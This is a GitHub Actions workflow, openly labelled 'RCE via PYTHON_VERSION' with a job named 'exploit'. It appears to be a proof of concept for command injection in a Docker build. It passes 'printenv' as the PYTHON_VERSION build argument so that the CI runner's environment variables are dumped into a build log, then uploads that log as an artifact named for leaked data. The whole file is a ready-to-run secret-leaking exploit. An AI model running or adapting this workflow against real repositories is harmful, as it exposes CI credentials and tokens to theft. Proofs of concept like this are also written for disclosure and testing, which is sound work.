name: RCE via PYTHON_VERSION

on: [push]

jobs:
  exploit:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v3

      - name: Inject and Capture Build Output
        run: |
          mkdir -p artifacts # Ensure the directory exists

          # 1. Build the Docker image with the injection
          #    This payload prints environment variables to stdout.
          docker build \
            --build-arg PYTHON_VERSION="printenv" \
            -t leak-image \
            ./taskcluster/docker/python \
            2>&1 | tee artifacts/leaked_build_output.txt

          # You can optionally print the captured output to the workflow logs for quick viewing
          echo "--- Contents of leaked_build_output.txt ---"
          cat artifacts/leaked_build_output.txt || echo "No build output captured."

      - name: Upload Leaked Data as Artifact
        uses: actions/upload-artifact@v3 # Using a specific version
        with:
          name: leaked-ci-data-from-buildlog
          path: artifacts/leaked_build_output.txt
